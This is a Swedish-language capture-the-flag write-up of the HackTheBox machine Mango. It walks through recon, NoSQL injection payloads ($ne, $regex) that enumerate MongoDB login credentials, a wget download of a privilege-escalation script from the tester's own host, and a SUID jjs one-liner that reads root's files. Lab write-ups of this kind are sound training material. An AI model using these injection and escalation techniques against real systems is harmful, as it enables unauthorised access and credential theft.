---
title: "HackThebox: Mango Writeup"
date: 2020-06-4 23:07:44 +0000
categories:
  - blog
tags:
  - CTF
  - HTB
  - Swedish
---

Jag ligger ett par veckor efter i planeringen, och skulle egentligen publicerat den här wirteupen för länge sedan, men det går inte alltid som man vill! Jag hoppas kunna fylla på här med mer innehåll snarast möjligt. 

Det här inlägget är en writeup på HTB-maskinen Mango, utöver vanlig recon-aktivitet så innefattar den NoSQL-injektioner i MongoDB, lite lösenordsknäckning via Python & SUID-exploatering för privilege escalation, happy reading! 

# Recon
**nmap -sC -sV -oA nmap/initial 10.10.10.162**

~~~
Nmap scan report for 10.10.10.162
Host is up (0.081s latency).
Not shown: 940 closed ports, 57 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
|_SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Inte så mycket som sticker ut efter att ha kört nmap, däremot uppmärksammade jag ett SSL-cerifikat som exponerade någon form av staging-domän och bestämde mig för att titta på den. 

*SSL Certifikatet*

ssl-cert: Subject:
commonName=**staging-order.mango.htb**organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
....

Så jag drar igång gobuster mot staging domänen för att se om där finns något spännande, jag letar efter php-filer med växeln -x eftersom index-filen är av typen php.

**gobuster dir -u https://staging-order.mango.htb -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -x php**
~~~


===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://staging-order.mango.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/02/18 17:21:45 Starting gobuster
===============================================================
/index.php (Status: 200)
/analytics.php (Status: 200)
Progress: 17365 / 220561 (7.87%)
~~~

Detta visar att det finns en analytics-applikation jag kan komma åt, det här visade sig vara ett s.k. "Rabbit hole" och ledde ingenstans, därför kommer jag inte skriva mer om det.

På staging-domänen finns annars bara en inloggningssida, och som vanligt när det gäller HTB-maskiner brukar namnet i sig vara en ledtråd & så även denna gång mango = mongoDB? 

![Staging-domän](https://jackhack.se/assets/images/staging.png)

Eftersom MongoDB är en NoSQL-databas bestämde jag mig för att testa NoSQL-injektioner, efter att ha kollat upp NoSQL-injektioner hos [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) startade jag upp Burp suite..

# NoSQL Injection (MongoDB)
Några variabler att hålla koll på vid testning: 

* \$eq     "equal to"
* \$gt     "greater than"
* \$gte    "greater than or equal to"
* \$ne     "not equal to"

Väl i Burp interceptade jag inloggnings-requesten & kollade vilken respons jag fick när jag testade logga in med användarnamnet *admin* & lösenordet *test*, responskoden var 200 OK

![Burp](https://jackhack.se/assets/images/burp_1.png)

Samma request med användarnamnet admin & lösenordet *\[$ne]test* (alltså **INTE** *test*) fick jag istället responskoden 302 Found


![Burp 302](https://jackhack.se/assets/images/burp_2.png)

Testet indikerar på att det finns en användare vid namn admin, som inte har lösenordet *test* och kan logga in på sidan. 

Nu skulle det vara möjligt att tecken för tecken lista ut användarnamn & lösenord genom att använda sig av reguljära uttryck, t.ex.:

**Först ta reda på längden på lösenordet**
* username=admin&password[$regex]=^.{1}&login=login
Responskod 200 (lösenordet är alltså INTE ett tecken)
* username=admin&password[$regex]=^.{2}&login=login
Responskod 200, lösenordet är alltså INTE två tecken
* ...
* username=admin&password[$regex]=^.{12}&login=login
Responskod 302 Found, lösenordet är alltså 12 tecken!

Sedan kan samma regexp-metod användas för att testa alla bokstäver,siffror och specialtecken för att tecken för tecken lista ut lösenordet.

Detta är såklart ingenting man vill göra för hand, tur att det finns script för detta, jag använde följande script från [GitHub](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/blob/master/nosqli-user-pass-enum.py)

Efter att ha kört scriptet mot staging-sidan fick jag fram följande inloggningsuppgifter:

* mango:h3mXK8RhU~f{]f5H
* admin:t9KcS3>!0B#2

# User
Eftersom jag kunde se att port 22 var öppen vid Nmap-scanningen testade jag att logga in via SSH, användaren admin fungerade inte men mango-kontot gav access.

Väl inne i maskinen fanns där ingen user-flagga i mango's hemkatalog, så jag bytte till admin-kontot.


~~~
ssh mango@mango.htb

su admin
cd
cat user.txt
~~~
{: .language-bash}
# Root

När jag har fått en limiterad shell brukar jag köra något av privilege escalation scripten LinEnum eller linuxprivchecker, jag förde över linuxprivchecker genom att sätta upp en python-webserver snabbt.

~~~
--- I Kali ---
cd /opt/scripts/
python -m SimpleHTTPServer 80
--- På remote-maskin ---
wget http://10.10.15.23/linuxprivchecker.py
python linuxprivchecker.py
~~~
{: .language-bash}
Scriptet visade en binärfil vid namn "jjs" som har "SUID"-flagga satt och därför kan köras med administratörsrättigheter, jag kollade upp binären i repot [gtfobins](https://gtfobins.github.io/gtfobins/jjs/) för att se vad jag kunde åstadkomma med den. 

Jag fick inte till det med mina försök att använda jjs för att upprätta en reverse-shell mellan min kali-host och maskinen. Däremot kunde jag köra följande kod för att läsa root-flaggan.

~~~
echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
while ((line = br.readLine()) != null) { print(line); }' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

root.txt:8a8ef79a7a2fbb01ea81688424e9ab15
~~~
{: .language-bash}

